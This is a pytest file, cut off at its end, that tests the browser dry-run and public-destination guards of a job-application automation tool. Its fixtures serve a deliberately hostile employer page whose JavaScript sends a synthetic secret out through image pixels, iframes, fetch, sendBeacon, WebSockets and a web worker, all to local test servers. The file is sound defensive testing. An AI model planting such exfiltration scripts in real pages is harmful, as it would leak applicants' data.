"""Browser-layer dry-run guard integration coverage."""

from __future__ import annotations

import json
import os
import socket
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

from jobctrl.apply import chrome
from jobctrl.infrastructure.network import PublicUrlDecision


_SYSTEM_BROWSER_SMOKE_ENV = "JOBCTRL_RUN_SYSTEM_BROWSER_TESTS"


@pytest.fixture(autouse=True)
def permit_browser_for_existing_guard_tests(monkeypatch: pytest.MonkeyPatch) -> None:
    """These tests exercise CDP guards after capability enforcement has passed."""

    monkeypatch.setattr(
        chrome,
        "require_system_browser_capability",
        lambda _capability: chrome.config.get_chrome_path(),
    )
    monkeypatch.setattr(
        chrome,
        "system_browser_capability_is_enabled",
        lambda _capability: True,
    )


class _HostileEmployerHandler(BaseHTTPRequestHandler):
    posts: list[str] = []
    deletes: list[str] = []
    image_get_exfiltrations: list[str] = []
    document_get_exfiltrations: list[str] = []

    def do_GET(self) -> None:  # noqa: N802 - stdlib hook name
        if self.path.startswith("/image-exfil"):
            type(self).image_get_exfiltrations.append(self.path)
            self.send_response(204)
            self.end_headers()
            return
        if self.path.startswith("/document-exfil"):
            type(self).document_get_exfiltrations.append(self.path)
            self.send_response(204)
            self.end_headers()
            return
        employer_origin = f"http://127.0.0.1:{self.server.server_port}"
        websocket_origin = f"ws://127.0.0.1:{self.server.server_port}"
        body = f"""
        <!doctype html>
        <html>
          <body>
            <input id="candidate" name="candidate">
            <form id="application-form" method="post" action="{employer_origin}/form-submit">
              <button type="submit">Submit</button>
            </form>
            <script>
              const input = document.getElementById("candidate");
              input.value = "synthetic-profile-secret";
              const pixel = new Image();
              pixel.src = "{employer_origin}/image-exfil?value=" + encodeURIComponent(input.value);
              const frame = document.createElement("iframe");
              frame.src = "{employer_origin}/document-exfil?value=" + encodeURIComponent(input.value);
              document.body.appendChild(frame);
              fetch("{employer_origin}/auto-submit", {{ method: "POST", body: "auto" }}).catch(() => {{}});
              fetch("{employer_origin}/delete-submit", {{ method: "DELETE" }}).catch(() => {{}});
              try {{ navigator.sendBeacon("{employer_origin}/beacon", "beacon"); }} catch (_) {{}}
              try {{ new WebSocket("{websocket_origin}/socket"); }} catch (_) {{}}
              window.addEventListener("load", () => {{
                setTimeout(() => {{
                  document.getElementById("application-form").requestSubmit();
                }}, 50);
              }});
            </script>
          </body>
        </html>
        """.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self) -> None:  # noqa: N802 - stdlib hook name
        type(self).posts.append(self.path)
        self.send_response(204)
        self.end_headers()

    def do_DELETE(self) -> None:  # noqa: N802 - stdlib hook name
        type(self).deletes.append(self.path)
        self.send_response(204)
        self.end_headers()

    def log_message(self, _format: str, *_args: object) -> None:
        return


class _WorkerEmitterHandler(BaseHTTPRequestHandler):
    collector_origin = ""
    page_requests = 0
    worker_script_requests = 0

    def do_GET(self) -> None:  # noqa: N802 - stdlib hook name
        if self.path == "/worker.js":
            type(self).worker_script_requests += 1
            body = (
                "fetch("
                + json.dumps(f"{type(self).collector_origin}/collect?value=worker-canary")
                + ", {mode: 'no-cors'}).catch(() => {});"
            ).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        type(self).page_requests += 1
        body = b"""<!doctype html><script>new Worker('/worker.js');</script>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, _format: str, *_args: object) -> None:
        return


class _WorkerCollectorHandler(BaseHTTPRequestHandler):
    requests: list[str] = []

    def do_GET(self) -> None:  # noqa: N802 - stdlib hook name
        type(self).requests.append(self.path)
        self.send_response(204)
        self.end_headers()

    def log_message(self, _format: str, *_args: object) -> None:
        return


@pytest.mark.system_browser
def test_dry_run_cdp_guard_blocks_hostile_employer_exfiltration(tmp_path, monkeypatch):
    """Exercise the real system-browser guard only when explicitly requested.

    Routine unit CI proves the same hostile channels through fake CDP below.
    Run this optional smoke with ``JOBCTRL_RUN_SYSTEM_BROWSER_TESTS=1 pytest -m
    system_browser workers/automation/tests/test_apply_chrome_dry_run_guard.py``.
    Once requested, the test deliberately does not skip an unavailable or
    unlaunchable browser: that is a failed smoke, not an absent unit-test
    dependency.
    """

    if os.environ.get(_SYSTEM_BROWSER_SMOKE_ENV) != "1":
        pytest.skip(
            "system-browser smoke is opt-in; "
            f"set {_SYSTEM_BROWSER_SMOKE_ENV}=1 to run it"
        )

    chrome.config.get_chrome_path()

    _HostileEmployerHandler.posts = []
    _HostileEmployerHandler.deletes = []
    _HostileEmployerHandler.image_get_exfiltrations = []
    _HostileEmployerHandler.document_get_exfiltrations = []
    server = ThreadingHTTPServer(("127.0.0.1", 0), _HostileEmployerHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()

    def setup_profile(worker_id: int) -> Path:
        profile = tmp_path / f"profile-{worker_id}"
        (profile / "Default").mkdir(parents=True, exist_ok=True)
        return profile

    monkeypatch.setattr(chrome, "setup_worker_profile", setup_profile)
    monkeypatch.setattr(chrome, "validate_public_http_url", lambda _url: PublicUrlDecision(True))
    try:
        dry_port = _free_port()
        dry_proc = chrome.launch_chrome(
            worker_id=901,
            port=dry_port,
            headless=True,
            dry_run=True,
            approved_application_url=f"http://127.0.0.1:{server.server_port}/",
        )
        try:
            _wait_for_page_target(dry_port)
            _wait_for_dry_run_guard(dry_port)
            _create_page_target(dry_port, "about:blank")
            deadline = time.time() + 5
            while (
                chrome.get_dry_run_cdp_guard_evidence(dry_port)["protected_targets"] < 2
                and time.time() < deadline
            ):
                time.sleep(0.05)
            assert chrome.get_dry_run_cdp_guard_evidence(dry_port)["protected_targets"] >= 2
            blocked = _navigate_and_read_blocked_flag(
                dry_port,
                f"http://127.0.0.1:{server.server_port}/",
            )
            time.sleep(1.0)
            assert blocked is True
            assert _HostileEmployerHandler.posts == []
            assert _HostileEmployerHandler.deletes == []
            assert _HostileEmployerHandler.image_get_exfiltrations == []
            assert _HostileEmployerHandler.document_get_exfiltrations == []
            evidence = chrome.get_dry_run_cdp_guard_evidence(dry_port)
            channels = set(evidence["blocked_channels"])
            assert evidence["coverage"] == "partial"
            assert len(evidence["allowed_navigations"]) == 1
            assert (
                evidence["allowed_navigations"][0]["decision"]
                == "run_bound_initial_url"
            )
            assert (
                evidence["allowed_navigations"][0]["url"]
                == f"http://127.0.0.1:{server.server_port}/"
            )
            assert "network:GET" in channels
            assert "network:POST" in channels
            assert "network:DELETE" in channels
        finally:
            chrome.cleanup_worker(901, dry_proc)

        live_port = _free_port()
        live_proc = chrome.launch_chrome(
            worker_id=902,
            port=live_port,
            headless=True,
            dry_run=False,
            approved_application_url=f"http://127.0.0.1:{server.server_port}/",
        )
        try:
            _navigate_and_read_blocked_flag(
                live_port,
                f"http://127.0.0.1:{server.server_port}/",
            )
            deadline = time.time() + 5
            while (
                (
                    not _HostileEmployerHandler.posts
                    or not _HostileEmployerHandler.deletes
                    or not _HostileEmployerHandler.image_get_exfiltrations
                    or not _HostileEmployerHandler.document_get_exfiltrations
                )
                and time.time() < deadline
            ):
                time.sleep(0.1)
            assert _HostileEmployerHandler.posts
            assert _HostileEmployerHandler.deletes
            assert _HostileEmployerHandler.image_get_exfiltrations
            assert _HostileEmployerHandler.document_get_exfiltrations
        finally:
            chrome.cleanup_worker(902, live_proc)
    finally:
        server.shutdown()
        server.server_close()


@pytest.mark.system_browser
def test_live_origin_guard_blocks_cross_origin_worker_request(
    tmp_path,
    monkeypatch,
) -> None:
    if os.environ.get(_SYSTEM_BROWSER_SMOKE_ENV) != "1":
        pytest.skip(
            "system-browser smoke is opt-in; "
            f"set {_SYSTEM_BROWSER_SMOKE_ENV}=1 to run it"
        )

    chrome.config.get_chrome_path()
    collector = ThreadingHTTPServer(("127.0.0.1", 0), _WorkerCollectorHandler)
    emitter = ThreadingHTTPServer(("127.0.0.1", 0), _WorkerEmitterHandler)
    collector_thread = threading.Thread(
        target=collector.serve_forever,
        daemon=True,
    )
    emitter_thread = threading.Thread(target=emitter.serve_forever, daemon=True)
    collector_thread.start()
    emitter_thread.start()
    _WorkerCollectorHandler.requests = []
    _WorkerEmitterHandler.page_requests = 0
    _WorkerEmitterHandler.worker_script_requests = 0
    _WorkerEmitterHandler.collector_origin = f"http://127.0.0.1:{collector.server_port}"
    approved_url = f"http://127.0.0.1:{emitter.server_port}/"

    def setup_profile(worker_id: int) -> Path:
        profile = tmp_path / f"profile-{worker_id}"
        (profile / "Default").mkdir(parents=True, exist_ok=True)
        return profile

    monkeypatch.setattr(chrome, "setup_worker_profile", setup_profile)
    monkeypatch.setattr(
        chrome,
        "validate_public_http_url",
        lambda _url: PublicUrlDecision(True),
    )
    port = _free_port()
    process = None
    try:
        process = chrome.launch_chrome(
            worker_id=905,
            port=port,
            headless=True,
            dry_run=False,
            approved_application_url=approved_url,
        )
        _wait_for_page_target(port)
        _create_page_target(port, approved_url)
        deadline = time.time() + 5
        while _WorkerEmitterHandler.page_requests == 0 and time.time() < deadline:
            time.sleep(0.05)
        assert _WorkerEmitterHandler.page_requests == 1
        time.sleep(0.5)
        assert _WorkerCollectorHandler.requests == []
        with chrome._public_destination_guards_lock:
            guard = chrome._public_destination_guards[port]
        assert "worker_target:TARGET" in guard.evidence()["blocked_channels"]
        assert guard.evidence()["protected_targets"] >= 1
    finally:
        if process is not None:
            chrome.cleanup_worker(905, process)
        emitter.shutdown()
        emitter.server_close()
        collector.shutdown()
        collector.server_close()


def test_dry_run_navigation_grant_rejects_every_ungranted_request_shape():
    approved_url = "https://apply.example.com/job/42?source=review"
    guard = chrome._DryRunCdpGuard(
        port=1,
        approved_application_url=approved_url,
    )

    for method in ("POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"):
        assert (
            guard.consume_navigation_grant(
                method=method,
                url=approved_url,
                resource_type="Document",
            )
            is False
        )
    for resource_type in ("Image", "Fetch", "Script", "XHR"):
        assert (
            guard.consume_navigation_grant(
                method="GET",
                url=approved_url,
                resource_type=resource_type,
            )
            is False
        )
    assert (
        guard.consume_navigation_grant(
            method="GET",
            url=approved_url,
            resource_type="Document",
        )
        is True
    )
    assert (
        guard.consume_navigation_grant(
            method="GET",
            url=approved_url,
            resource_type="Document",
        )
        is False
    )


def test_browser_guard_session_blocks_hostile_dry_run_events_before_resume(monkeypatch) -> None:
    """Keep the CDP guard contract hermetic while covering every hostile channel."""

    class _FakeWebSocket:
        def __init__(self) -> None:
            self.sent: list[dict] = []

        def send(self, payload: str) -> None:
            self.sent.append(json.loads(payload))

        def close(self) -> None:
            return None

    class _FakeWebsocketModule:
        class WebSocketTimeoutException(Exception):
            pass

    websocket_connection = _FakeWebSocket()
    guard = chrome._DryRunCdpGuard(
        port=1,
        approved_application_url="https://employer.example/apply",
    )
    session = chrome._BrowserApplyGuardSession(_FakeWebsocketModule, websocket_connection, guard)
    monkeypatch.setattr(chrome, "validate_public_http_url", lambda _url: PublicUrlDecision(True))

    session._handle_message(
        {
            "method": "Target.attachedToTarget",
            "params": {
                "sessionId": "hostile-session",
                "waitingForDebugger": True,
                "targetInfo": {"targetId": "hostile-page", "type": "page"},
            },
        }
    )
    setup_commands = list(websocket_connection.sent)
    setup_methods = [command["method"] for command in setup_commands]
    assert setup_methods.index("Page.addScriptToEvaluateOnNewDocument") < setup_methods.index(
        "Fetch.enable"
    )
    assert "Runtime.runIfWaitingForDebugger" not in setup_methods

    for command in setup_commands:
        session._handle_message({"id": command["id"], "result": {}})

    session_methods = [command["method"] for command in websocket_connection.sent]
    assert session_methods.index("Fetch.enable") < session_methods.index("Runtime.runIfWaitingForDebugger")
    assert guard.evidence()["protected_targets"] == 1

    resume_command = next(
        command
        for command in websocket_connection.sent
        if command["method"] == "Runtime.runIfWaitingForDebugger"
    )
    session._handle_message({"id": resume_command["id"], "result": {}})
    assert session._resumed_targets == {"hostile-page"}

    session._handle_message(
        {
            "method": "Runtime.bindingCalled",
            "sessionId": "hostile-session",
            "params": {
                "name": "jobctrlDryRunBlocked",
                "payload": json.dumps(
                    {
                        "channel": "form_submit",
                        "method": "POST",
                        "url": "https://employer.example/apply?candidate=secret",
                        "resourceType": "Document",
                    }
                ),
            },
        }
    )
    session._handle_message(
        {
            "method": "Network.webSocketCreated",
            "sessionId": "hostile-session",
            "params": {"url": "wss://employer.example/exfiltrate?candidate=secret"},
        }
    )
    session._handle_message(
        {
            "method": "Fetch.requestPaused",
            "sessionId": "hostile-session",
            "params": {
                "requestId": "hostile-fetch",
                "networkId": "network-hostile-fetch",
                "resourceType": "Fetch",
                "request": {
                    "method": "POST",
                    "url": "https://employer.example/exfiltrate?candidate=secret",
                },
            },
        }
    )

    failed_request = next(
        command
        for command in websocket_connection.sent
        if command["method"] == "Fetch.failRequest"
    )
    assert failed_request["sessionId"] == "hostile-session"
    assert failed_request["params"] == {
        "requestId": "hostile-fetch",
        "errorReason": "BlockedByClient",
    }
    assert "Fetch.continueRequest" not in [command["method"] for command in websocket_connection.sent]
    assert set(guard.evidence()["blocked_channels"]) == {
        "WebSocket:WEBSOCKET",
        "form_submit:POST",
        "network:POST",
    }
    assert guard.evidence()["coverage"] == "partial"
    session._close()


def test_launch_chrome_installs_public_destination_guard_for_live_runs(tmp_path, monkeypatch):
    calls: list[tuple[str, int]] = []

    class _FakeProcess:
        pid = 4242

        def poll(self) -> None:
            return None

    def setup_profile(worker_id: int) -> Path:
        profile = tmp_path / f"profile-{worker_id}"
        (profile / "Default").mkdir(parents=True, exist_ok=True)
        return profile

    monkeypatch.setattr(chrome, "setup_worker_profile", setup_profile)
    monkeypatch.setattr(chrome, "_kill_on_port", lambda _port: None)
    monkeypatch.setattr(chrome, "_suppress_restore_nag", lambda _profile: None)
    monkeypatch.setattr(chrome.config, "get_chrome_path", lambda: "/bin/echo")
    monkeypatch.setattr(chrome.subprocess, "Popen", lambda *_args, **_kwargs: _FakeProcess())
    monkeypatch.setattr(chrome.time, "sleep", lambda _seconds: None)
    monkeypatch.setattr(
        chrome,
        "install_public_destination_cdp_guard",
        lambda port, **_ownership: calls.append(("public", port)),
    )
    monkeypatch.setattr(
        chrome,
        "install_dry_run_cdp_guard",
        lambda port, **_ownership: calls.append(("dry_run", port)),
    )

    chrome.launch_chrome(
        worker_id=903,
        port=9555,
        headless=True,
        dry_run=False,
        approved_application_url="https://apply.example.com/job",
    )

    assert calls == [("public", 9555)]


def test_launch_chrome_uses_combined_dry_run_guard_for_dry_runs(tmp_path, monkeypatch):
    calls: list[tuple[str, int]] = []

    class _FakeProcess:
        pid = 4343

        def poll(self) -> None:
            return None

    def setup_profile(worker_id: int) -> Path:
        profile = tmp_path / f"profile-{worker_id}"
        (profile / "Default").mkdir(parents=True, exist_ok=True)
        return profile

    monkeypatch.setattr(chrome, "setup_worker_profile", setup_profile)
    monkeypatch.setattr(chrome, "_kill_on_port", lambda _port: None)
    monkeypatch.setattr(chrome, "_suppress_restore_nag", lambda _profile: None)
    monkeypatch.setattr(chrome.config, "get_chrome_path", lambda: "/bin/echo")
    monkeypatch.setattr(chrome.subprocess, "Popen", lambda *_args, **_kwargs: _FakeProcess())
    monkeypatch.setattr(chrome.time, "sleep", lambda _seconds: None)
    monkeypatch.setattr(
        chrome,
        "install_public_destination_cdp_guard",
        lambda port, **_ownership: calls.append(("public", port)),
    )
    monkeypatch.setattr(
        chrome,
        "install_dry_run_cdp_guard",
        lambda port, **_ownership: calls.append(("dry_run", port)),
    )

    chrome.launch_chrome(
        worker_id=904,
        port=9666,
        headless=True,
        dry_run=True,
        approved_application_url="https://apply.example.com/job",
    )

    assert calls == [("dry_run", 9666)]
    assert (
        chrome._DryRunCdpGuard(
            port=1,
            approved_application_url="https://apply.example.com/job",
        ).enforce_dry_run
        is True
    )
    assert (
        chrome._PublicDestinationCdpGuard(
            port=1,
            approved_application_url="https://apply.example.com/job",
        ).enforce_dry_run
        is False
    )


def test_browser_guard_waits_for_initial_fetch_ack_and_pauses_new_pages() -> None:
    class _Timeout(Exception):
        pass

    class _FakeWebsocketModule:
        WebSocketTimeoutException = _Timeout

    class _FakeBrowserWebSocket:
        def __init__(self) -> None:
            self.sent: list[dict] = []
            self._messages: list[str] = []
            self._condition = threading.Condition()
            self._held_fetch_id: int | None = None
            self.fetch_sent = threading.Event()

        def _enqueue(self, message: dict) -> None:
            with self._condition:
                self._messages.append(json.dumps(message))
                self._condition.notify_all()

        def send(self, payload: str) -> None:
            message = json.loads(payload)
            self.sent.append(message)
            method = message["method"]
            message_id = message["id"]
            if method == "Target.getTargets":
                self._enqueue(
                    {
                        "id": message_id,
                        "result": {
                            "targetInfos": [
                                {"targetId": "initial-page", "type": "page"},
                            ]
                        },
                    }
                )
                return
            if method == "Target.attachToTarget":
                self._enqueue(
                    {"id": message_id, "result": {"sessionId": "initial-session"}}
                )
                return
            if method == "Fetch.enable" and self._held_fetch_id is None:
                self._held_fetch_id = message_id
                self.fetch_sent.set()
                return
            self._enqueue({"id": message_id, "sessionId": message.get("sessionId"), "result": {}})

        def release_initial_fetch(self) -> None:
            assert self._held_fetch_id is not None
            self._enqueue(
                {
                    "id": self._held_fetch_id,
                    "sessionId": "initial-session",
                    "result": {},
                }
            )

        def recv(self) -> str:
            with self._condition:
                if not self._messages:
                    self._condition.wait(timeout=0.02)
                if not self._messages:
                    raise _Timeout
                return self._messages.pop(0)

        def close(self) -> None:
            return None

    websocket_connection = _FakeBrowserWebSocket()
    guard = chrome._PublicDestinationCdpGuard(
        port=1,
        approved_application_url="https://careers.example.com/apply",
        capability_checker=lambda: True,
    )
    session = chrome._BrowserApplyGuardSession(
        _FakeWebsocketModule,
        websocket_connection,
        guard,
    )
    errors: list[BaseException] = []

    def arm() -> None:
        try:
            session.arm_and_wait_until_ready(timeout=2)
        except BaseException as exc:  # pragma: no cover - asserted below
            errors.append(exc)

    arm_thread = threading.Thread(target=arm)
    arm_thread.start()
    assert websocket_connection.fetch_sent.wait(timeout=2)
    arm_thread.join(timeout=0.1)
    assert arm_thread.is_alive(), "guard startup must wait for the Fetch.enable response"
    assert guard.evidence()["protected_targets"] == 0

    websocket_connection.release_initial_fetch()
    arm_thread.join(timeout=2)
    assert not arm_thread.is_alive()
    assert errors == []
    assert guard.evidence()["protected_targets"] == 1
    assert any(message["method"] == "Target.attachToTarget" for message in websocket_connection.sent)
    auto_attach = next(
        message
        for message in websocket_connection.sent
        if message["method"] == "Target.setAutoAttach"
    )
    assert auto_attach["params"] == {
        "autoAttach": True,
        "waitForDebuggerOnStart": True,
        "flatten": True,
    }

    session._handle_message(
        {
            "method": "Target.attachedToTarget",
            "params": {
                "sessionId": "new-session",
                "waitingForDebugger": True,
                "targetInfo": {"targetId": "new-page", "type": "page"},
            },
        }
    )
    deadline = time.time() + 2
    while "new-page" not in session._resumed_targets and time.time() < deadline:
        session._receive_one()
    new_session_methods = [
        message["method"]
        for message in websocket_connection.sent
        if message.get("sessionId") == "new-session"
    ]
    assert "Fetch.enable" in new_session_methods
    assert new_session_methods.index("Fetch.enable") < new_session_methods.index(
        "Runtime.runIfWaitingForDebugger"
    )
    assert guard.evidence()["protected_targets"] == 2
    session._close()


def test_cleanup_worker_terminates_the_tracked_chrome_process(monkeypatch):
    class _RunningProcess:
        pid = 9182

        def poll(self) -> None:
            return None

    worker_id = 918
    process = _RunningProcess()
    killed: list[int] = []
    monkeypatch.setattr(chrome, "_kill_process_tree", lambda pid: killed.append(pid))
    with chrome._chrome_lock:
        chrome._chrome_procs[worker_id] = process

    chrome.cleanup_worker(worker_id, process)

    assert killed == [9182]
    with chrome._chrome_lock:
        assert worker_id not in chrome._chrome_procs


def test_public_destination_cdp_guard_fails_loopback_requests(monkeypatch):
    websocket = pytest.importorskip("websocket")
    sent: list[dict] = []

    class _FakeWebSocket:
        def __init__(self) -> None:
            self._delivered = False

        def send(self, payload: str) -> None:
            sent.append(json.loads(payload))

        def recv(self) -> str:
            if self._delivered:
                raise RuntimeError("end test session")
            self._delivered = True
            return json.dumps(
                {
                    "method": "Fetch.requestPaused",
                    "params": {
                        "requestId": "intercept-1",
                        "networkId": "network-1",
                        "resourceType": "Document",
                        "request": {
                            "method": "GET",
                            "url": "http://127.0.0.1:8766/v1/profile",
                        },
                    },
                }
            )

        def close(self) -> None:
            return None

    monkeypatch.setattr(websocket, "create_connection", lambda *_args, **_kwargs: _FakeWebSocket())

    guard = chrome._PublicDestinationCdpGuard(
        port=1,
        approved_application_url="https://careers.example.com/apply",
        capability_checker=lambda: True,
    )
    chrome._run_apply_page_session("target-1", "ws://example.invalid/devtools/page/1", guard)

    assert {
        "id": 4,
        "method": "Fetch.failRequest",
        "params": {"requestId": "intercept-1", "errorReason": "BlockedByClient"},
    } in sent
    assert all(message.get("method") != "Fetch.continueRequest" for message in sent)
    assert guard.evidence()["blocked_channels"] == ("public_destination:GET",)
    assert guard.evidence()["protected_targets"] == 1


def test_public_destination_cdp_guard_continues_public_requests(monkeypatch):
    websocket = pytest.importorskip("websocket")
    sent: list[dict] = []

    class _FakeWebSocket:
        def __init__(self) -> None:
            self._delivered = False

        def send(self, payload: str) -> None:
            sent.append(json.loads(payload))

        def recv(self) -> str:
            if self._delivered:
                raise RuntimeError("end test session")
            self._delivered = True
            return json.dumps(
                {
                    "method": "Fetch.requestPaused",
                    "params": {
                        "requestId": "intercept-2",
                        "networkId": "network-2",
                        "resourceType": "Document",
                        "request": {
                            "method": "GET",
                            "url": "https://careers.example.com/apply",
                        },
                    },
                }
            )

        def close(self) -> None:
            return None

    monkeypatch.setattr(websocket, "create_connection", lambda *_args, **_kwargs: _FakeWebSocket())
    monkeypatch.setattr(chrome, "validate_public_http_url", lambda _url: PublicUrlDecision(True))

    guard = chrome._PublicDestinationCdpGuard(
        port=1,
        approved_application_url="https://careers.example.com/apply",
        capability_checker=lambda: True,
    )
    chrome._run_apply_page_session("target-2", "ws://example.invalid/devtools/page/2", guard)

    assert {
        "id": 4,
        "method": "Fetch.continueRequest",
        "params": {"requestId": "intercept-2"},
    } in sent
    assert all(message.get("method") != "Fetch.failRequest" for message in sent)
    assert guard.evidence()["protected_targets"] == 1


def test_public_destination_guard_fails_live_http_submit_after_capability_revocation(monkeypatch):
    """Revocation is enforced at the paused HTTP request, not next job claim."""

    websocket = pytest.importorskip("websocket")
    sent: list[dict] = []
    killed_processes: list[int] = []

    class _RunningProcess:
        pid = 7319

        def poll(self) -> None:
            return None

    class _FakeWebSocket:
        def __init__(self) -> None:
            self._delivered = False

        def send(self, payload: str) -> None:
            sent.append(json.loads(payload))

        def recv(self) -> str:
            if self._delivered:
                raise RuntimeError("end test session")
            self._delivered = True
            return json.dumps(
                {
                    "method": "Fetch.requestPaused",
                    "params": {
                        "requestId": "submit-after-revoke",
                        "networkId": "network-submit",
                        "resourceType": "Document",
                        "request": {
                            "method": "POST",
                            "url": "https://careers.example.com/apply/submit",
                        },
                    },
                }
            )

        def close(self) -> None:
            return None

    monkeypatch.setattr(websocket, "create_connection", lambda *_args, **_kwargs: _FakeWebSocket())
    monkeypatch.setattr(chrome, "_kill_process_tree", lambda pid: killed_processes.append(pid))
    monkeypatch.setattr(
        chrome,
        "_kill_on_port",
        lambda _port: (_ for _ in ()).throw(AssertionError("revocation must not kill a port owner")),
    )

    worker_id = 731
    process = _RunningProcess()
    with chrome._chrome_lock:
        chrome._chrome_procs[worker_id] = process
    guard = chrome._PublicDestinationCdpGuard(
        port=8123,
        approved_application_url="https://careers.example.com/apply",
        capability_checker=lambda: False,
        worker_id=worker_id,
        process=process,
    )
    try:
        chrome._run_apply_page_session(
            "target-revoked",
            "ws://example.invalid/devtools/page/1",
            guard,
        )
    finally:
        with chrome._chrome_lock:
            chrome._chrome_procs.pop(worker_id, None)

    assert {
        "id": 4,
        "method": "Fetch.failRequest",
        "params": {"requestId": "submit-after-revoke", "errorReason": "BlockedByClient"},
    } in sent
    assert {"id": 5, "method": "Page.close", "params": {}} in sent
    assert all(message.get("method") != "Fetch.continueRequest" for message in sent)
    assert killed_processes == [7319]
    assert guard.evidence()["blocked_channels"] == ("capability_revoked:POST",)


def test_guard_revocation_preserves_foreign_listener_when_process_is_not_tracked(monkeypatch):
    class _RunningProcess:
        pid = 8181

        def poll(self) -> None:
            return None

    worker_id = 818
    owned_process = _RunningProcess()
    replaced_process = _RunningProcess()
    killed_processes: list[int] = []
    monkeypatch.setattr(chrome, "_kill_process_tree", lambda pid: killed_processes.append(pid))
    monkeypatch.setattr(
        chrome,
        "_kill_on_port",
        lambda _port: (_ for _ in ()).throw(AssertionError("revocation must not scan listeners")),
    )
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind(("127.0.0.1", 0))
        listener.listen()
        port = int(listener.getsockname()[1])
        with chrome._chrome_lock:
            chrome._chrome_procs[worker_id] = replaced_process
        guard = chrome._PublicDestinationCdpGuard(
            port=port,
            approved_application_url="https://careers.example.com/apply",
            capability_checker=lambda: False,
            worker_id=worker_id,
            process=owned_process,
        )
        try:
            guard.close_owned_browser()
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
                assert client.connect_ex(("127.0.0.1", port)) == 0
        finally:
            with chrome._chrome_lock:
                chrome._chrome_procs.pop(worker_id, None)

    assert killed_processes == []


def test_dry_run_guard_evidence_reports_unprotected_when_guard_is_missing():
    port = 64001
    with chrome._dry_run_guards_lock:
        chrome._dry_run_guards.pop(port, None)

    evidence = chrome.get_dry_run_cdp_guard_evidence(port)

    assert evidence == {
        "coverage": "unprotected",
        "blocked_channels": (),
        "blocked_requests": (),
        "allowed_navigations": (),
        "protected_targets": 0,
    }


def test_dry_run_guard_evidence_reports_unprotected_before_any_page_session_attaches():
    guard = chrome._DryRunCdpGuard(
        port=1,
        approved_application_url="https://employer.example/apply",
    )

    assert guard.evidence()["coverage"] == "unprotected"
    assert guard.evidence()["protected_targets"] == 0


def test_dry_run_guard_evidence_records_sanitized_submission_channels():
    guard = chrome._DryRunCdpGuard(
        port=1,
        approved_application_url="https://employer.example/apply",
    )
    guard.record_blocked_request(
        channel="network",
        method="DELETE",
        url="https://example.com/apply?token=secret#frag",
        resource_type="Fetch",
    )
    guard.record_blocked_request(
        channel="sendBeacon",
        method="POST",
        url="https://example.com/analytics?token=secret",
        resource_type="Ping",
    )
    guard.record_blocked_request(
        channel="WebSocket",
        method="WEBSOCKET",
        url="wss://example.com/socket?token=secret",
        resource_type="WebSocket",
    )

    evidence = guard.evidence()
    assert evidence["coverage"] == "partial"
    assert evidence["protected_targets"] == 0
    assert evidence["blocked_channels"] == (
        "WebSocket:WEBSOCKET",
        "network:DELETE",
        "sendBeacon:POST",
    )
    assert evidence["blocked_requests"] == (
        {
            "channel": "network",
            "method": "DELETE",
            "url": "https://example.com/apply",
            "resource_type": "Fetch",
        },
        {
            "channel": "sendBeacon",
            "method": "POST",
            "url": "https://example.com/analytics",
            "resource_type": "Ping",
        },
        {
            "channel": "WebSocket",
            "method": "WEBSOCKET",
            "url": "wss://example.com/socket",
            "resource_type": "WebSocket",
        },
    )


def _free_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


def _wait_for_page_target(port: int) -> str:
    deadline = time.time() + 10
    while time.time() < deadline:
        for target in chrome._cdp_json(port, "/json/list"):
            if isinstance(target, dict) and target.get("type") == "page":
                ws_url = str(target.get("webSocketDebuggerUrl") or "")
                if ws_url:
                    return ws_url
        time.sleep(0.1)
    raise AssertionError("Chrome did not expose a page CDP target")


def _create_page_target(port: int, url: str) -> str:
    websocket = pytest.importorskip("websocket")
    version = chrome._cdp_json(port, "/json/version")
    assert isinstance(version, dict)
    ws_url = str(version.get("webSocketDebuggerUrl") or "")
    assert ws_url
    ws = websocket.create_connection(ws_url, timeout=5, suppress_origin=True)
    try:
        ws.send(
            json.dumps(
                {
                    "id": 1,
                    "method": "Target.createTarget",
                    "params": {"url": url},
                }
            )
        )
        deadline = time.time() + 5
        while time.time() < deadline:
            message = json.loads(ws.recv())
            if message.get("id") == 1:
                target_id = str(message.get("result", {}).get("targetId") or "")
                assert target_id
                return target_id
    finally:
        ws.close()
    raise AssertionError("Chrome did not create the requested page target")


def _navigate_and_read_blocked_flag(port: int, url: str) -> bool:
    websocket = pytest.importorskip("websocket")
    ws = websocket.create_connection(
        _wait_for_page_target(port),
        timeout=5,
        suppress_origin=True,
    )
    counter = 0

    def send(method: str, params: dict | None = None) -> int:
        nonlocal counter
        counter += 1
        ws.send(json.dumps({"id": counter, "method": method, "params": params or {}}))
        return counter

    def wait_for_response(message_id: int) -> dict:
        deadline = time.time() + 10
        while time.time() < deadline:
            message = json.loads(ws.recv())
            if message.get("id") == message_id:
                return message
        raise AssertionError(f"CDP response {message_id} did not arrive")

    try:
        wait_for_response(send("Page.enable"))
        wait_for_response(send("Runtime.enable"))
        wait_for_response(send("Page.navigate", {"url": url}))
        deadline = time.time() + 5
        while time.time() < deadline:
            result = wait_for_response(
                send(
                    "Runtime.evaluate",
                    {
                        "expression": "document.readyState",
                        "returnByValue": True,
                    },
                )
            )
            if _cdp_value(result) == "complete":
                break
            time.sleep(0.1)
        wait_for_response(
            send(
                "Runtime.evaluate",
                {
                    "expression": (
                        "(() => { try { "
                        "document.getElementById('application-form')?.requestSubmit(); "
                        "} catch (error) {} "
                        "return Boolean(window.__jobctrl_dryrun_blocked); })()"
                    ),
                    "returnByValue": True,
                },
            )
        )
        deadline = time.time() + 5
        while time.time() < deadline:
            result = wait_for_response(
                send(
